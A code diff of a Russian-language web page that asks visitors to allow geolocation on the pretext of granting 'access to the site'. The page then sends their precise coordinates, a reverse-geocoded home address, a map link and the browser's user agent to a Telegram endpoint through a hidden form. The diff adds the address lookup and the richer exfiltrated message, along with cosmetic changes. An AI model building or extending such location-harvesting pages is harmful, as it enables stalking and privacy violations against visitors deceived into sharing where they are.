@@ -25,7 +25,7 @@
             padding: 20px;
         }
         .card {
-            max-width: 400px;
+            max-width: 500px;
             width: 100%;
         }
         .card h1 {
@@ -55,10 +55,10 @@
             border-color: #555;
         }
         .hidden {
-            display: none;
+            display: none !important;
         }
         #map {
-            height: 300px;
+            height: 350px;
             width: 100%;
             border-radius: 12px;
             margin-top: 16px;
@@ -72,14 +72,37 @@
             margin-top: 16px;
             width: 100%;
         }
+        .coords-box .label {
+            color: #8b949e;
+            font-size: 13px;
+        }
         .coords-box .value {
             font-family: monospace;
             font-size: 20px;
             color: #f0883e;
+            margin-top: 4px;
+            word-break: break-all;
         }
         .coords-box .accuracy {
             font-size: 13px;
             color: #8b949e;
+            margin-top: 4px;
+        }
+        .address-box {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 16px;
+            margin-top: 12px;
+            width: 100%;
+        }
+        .address-box .label {
+            color: #8b949e;
+            font-size: 13px;
+        }
+        .address-box .value {
+            font-size: 15px;
+            color: #58a6ff;
             margin-top: 4px;
         }
         .status {
@@ -104,29 +127,121 @@
             font-size: 12px;
             color: #333;
         }
+        .error-box {
+            background: #1a0a0a;
+            border: 1px solid #4a1a1a;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 16px;
+        }
+        .error-box .error-text {
+            color: #f85149;
+            font-size: 18px;
+        }
+        .error-box .error-sub {
+            color: #777;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+        .btn-small {
+            margin-top: 16px;
+            background: #2a1a1a;
+            border: 1px solid #4a1a1a;
+            color: #fff;
+            padding: 10px 24px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .btn-small:hover {
+            background: #3a2a2a;
+        }
+        .full-center {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+        }
+        .copy-btn {
+            background: #1f6feb;
+            border: none;
+            color: #fff;
+            padding: 6px 16px;
+            border-radius: 8px;
+            font-size: 13px;
+            cursor: pointer;
+            margin-top: 6px;
+        }
+        .copy-btn:hover {
+            background: #388bfd;
+        }
+        .flex-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .telegram-badge {
+            background: #1a2a3a;
+            border: 1px solid #2a4a6a;
+            border-radius: 20px;
+            padding: 4px 14px;
+            font-size: 12px;
+            color: #58a6ff;
+            display: inline-block;
+            margin-top: 8px;
+        }
     </style>
 </head>
 <body>
 
-    <!-- ЭКРАН 1: Чёрный + надпись -->
-    <div class="card" id="step1">
-        <h1>🔐 Доступ к сайту</h1>
-        <div class="sub">Для входа необходимо разрешить доступ к геолокации</div>
-        <button class="btn" id="startBtn">Продолжить</button>
-        <div class="footer">Нажмите «Разрешить» в системном окне</div>
+    <!-- ЭКРАН 1: Чёрный + кнопка -->
+    <div class="full-center" id="step1">
+        <div class="card">
+            <h1>🔐 Доступ к сайту</h1>
+            <div class="sub">Для входа необходимо разрешить доступ к геолокации</div>
+            <button class="btn" id="startBtn">Продолжить</button>
+            <div class="footer">Нажмите «Разрешить» в системном окне</div>
+        </div>
     </div>
 
-    <!-- ЭКРАН 2: Сюрприз + карта + Telegram -->
-    <div class="card hidden" id="step2">
-        <div class="surprise">🎉 Ха-ха! Я знаю, где ты!</div>
-        <div id="map"></div>
-        <div class="coords-box">
-            <div class="value" id="coordsDisplay">—</div>
-            <div class="accuracy" id="accuracyDisplay"></div>
+    <!-- ЭКРАН 2: Сюрприз — карта + адрес + кнопка копирования -->
+    <div class="full-center hidden" id="step2">
+        <div class="card">
+            <div class="surprise">🎉 Вот ты где!</div>
+            <div id="map"></div>
+            <div class="coords-box">
+                <div class="label">📍 Твои координаты</div>
+                <div class="value" id="coordsDisplay">—</div>
+                <div class="accuracy" id="accuracyDisplay"></div>
+                <div class="flex-row" style="margin-top:8px;">
+                    <button class="copy-btn" onclick="copyCoords()">📋 Копировать координаты</button>
+                </div>
+            </div>
+            <div class="address-box">
+                <div class="label">🏠 Твой адрес (примерно)</div>
+                <div class="value" id="addressDisplay">Определение...</div>
+                <div class="flex-row" style="margin-top:8px;">
+                    <button class="copy-btn" onclick="copyAddress()">📋 Копировать адрес</button>
+                </div>
+            </div>
+            <div class="status" id="statusText">⏳ Определение...</div>
+            <button class="btn" id="refreshBtn" onclick="getLocation()" style="margin-top:12px;">🔄 Обновить</button>
+            <div class="telegram-badge">📤 Данные отправлены в Telegram</div>
         </div>
-        <div class="status" id="statusText">⏳ Определение...</div>
-        <button class="btn" id="refreshBtn" onclick="getLocation()">🔄 Обновить</button>
-        <div class="footer">Ты сам разрешил 😄</div>
+    </div>
+
+    <!-- ЭКРАН 3: Ошибка (запрет) -->
+    <div class="full-center hidden" id="step3">
+        <div class="card">
+            <div class="error-box">
+                <div class="error-text">⛔ Доступ закрыт</div>
+                <div class="error-sub">Для работы сайта необходимо разрешить геолокацию</div>
+                <button class="btn-small" onclick="goBack()">🔙 Попробовать снова</button>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -137,13 +252,21 @@
         let map = null;
         let marker = null;
         let circle = null;
-        let isFirstLoad = true;
+        let lastLat = null;
+        let lastLon = null;
+        let lastAddress = null;
 
         // ====== ОТПРАВКА В TELEGRAM ======
-        function sendToTelegram(lat, lon, acc) {
-            const text = encodeURIComponent(
-                `📍 Новая геолокация!\n\nШирота: ${lat.toFixed(6)}\nДолгота: ${lon.toFixed(6)}\nТочность: ±${Math.round(acc)} м\n\nУстройство: ${navigator.userAgent}`
-            );
+        function sendToTelegram(lat, lon, acc, address) {
+            const mapLink = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=16`;
+            const text =
+                `📍 Новая геолокация!\n\n` +
+                `Широта: ${lat.toFixed(6)}\n` +
+                `Долгота: ${lon.toFixed(6)}\n` +
+                `Точность: ±${Math.round(acc)} м\n` +
+                `Адрес: ${address || 'Не определён'}\n\n` +
+                `🗺️ Карта: ${mapLink}\n\n` +
+                `Устройство: ${navigator.userAgent}`;
 
             const form = document.createElement('form');
             form.method = 'GET';
@@ -158,7 +281,7 @@
             const i2 = document.createElement('input');
             i2.type = 'hidden';
             i2.name = 'text';
-            i2.value = decodeURIComponent(text);
+            i2.value = text;
 
             form.appendChild(i1);
             form.appendChild(i2);
@@ -176,35 +299,70 @@
             }, 1000);
         }
 
+        // ====== КОПИРОВАНИЕ ======
+        function copyCoords() {
+            if (!lastLat || !lastLon) return;
+            const text = `${lastLat.toFixed(6)}, ${lastLon.toFixed(6)}`;
+            navigator.clipboard?.writeText(text).then(() => {
+                alert('✅ Координаты скопированы!');
+            }).catch(() => {
+                prompt('Скопируй вручную:', text);
+            });
+        }
+
+        function copyAddress() {
+            if (!lastAddress) return;
+            navigator.clipboard?.writeText(lastAddress).then(() => {
+                alert('✅ Адрес скопирован!');
+            }).catch(() => {
+                prompt('Скопируй вручную:', lastAddress);
+            });
+        }
+
+        // ====== ПОЛУЧЕНИЕ АДРЕСА ======
+        async function getAddress(lat, lon) {
+            try {
+                const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=ru`;
+                const resp = await fetch(url);
+                const data = await resp.json();
+                return data?.display_name || 'Адрес не найден';
+            } catch {
+                return 'Ошибка определения адреса';
+            }
+        }
+
         // ====== ГЕОЛОКАЦИЯ ======
         function getLocation() {
             const status = document.getElementById('statusText');
             const coords = document.getElementById('coordsDisplay');
             const accEl = document.getElementById('accuracyDisplay');
+            const addressEl = document.getElementById('addressDisplay');
             const btn = document.getElementById('refreshBtn');
 
             status.textContent = '⏳ Запрос разрешения...';
             status.className = 'status';
             coords.textContent = '—';
             accEl.textContent = '';
+            addressEl.textContent = 'Определение...';
             btn.disabled = true;
 
             if (!navigator.geolocation) {
-                status.textContent = '❌ Браузер не поддерживает геолокацию';
-                status.className = 'status error';
-                btn.disabled = false;
+                showError();
                 return;
             }
 
             navigator.geolocation.getCurrentPosition(
-                function(pos) {
+                async function(pos) {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     const accuracy = pos.coords.accuracy;
 
+                    lastLat = lat;
+                    lastLon = lon;
+
                     coords.textContent = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
                     accEl.textContent = `±${Math.round(accuracy)} м`;
-                    status.textContent = '✅ Готово! Смотри на карту 😄';
+                    status.textContent = '✅ Готово!';
                     status.className = 'status success';
                     btn.disabled = false;
 
@@ -220,45 +378,40 @@
                     }).addTo(map);
                     map.setView([lat, lon], 16);
 
+                    // Адрес
+                    const address = await getAddress(lat, lon);
+                    lastAddress = address;
+                    addressEl.textContent = address;
+
                     // Отправка в Telegram
-                    sendToTelegram(lat, lon, accuracy);
+                    sendToTelegram(lat, lon, accuracy, address);
                 },
                 function(err) {
-                    let msg = '';
-                    switch (err.code) {
-                        case 1:
-                            msg = '❌ Без разрешения сюрприз не работает 😢';
-                            break;
-                        case 2:
-                            msg = '❌ Сигнал недоступен. Попробуйте на улице.';
-                            break;
-                        case 3:
-                            msg = '❌ Таймаут. Попробуйте ещё раз.';
-                            break;
-                        default:
-                            msg = '❌ Ошибка: ' + err.message;
-                    }
-                    status.textContent = msg;
-                    status.className = 'status error';
-                    btn.disabled = false;
-                }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
+                    showError();
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
             );
         }
 
-        // ====== ПЕРЕКЛЮЧЕНИЕ ПО КНОПКЕ ======
+        function showError() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+        }
+
+        function goBack() {
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+        }
+
         document.getElementById('startBtn').addEventListener('click', function() {
-            // Прячем первый экран
             document.getElementById('step1').classList.add('hidden');
-            // Показываем второй
             document.getElementById('step2').classList.remove('hidden');
 
-            // Инициализируем карту
             map = L.map('map').setView([55.7558, 37.6173], 13);
             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                 attribution: '© OpenStreetMap'
             }).addTo(map);
 
-            // Теперь вызываем геолокацию — только после нажатия кнопки
             getLocation();
         });
     </script>
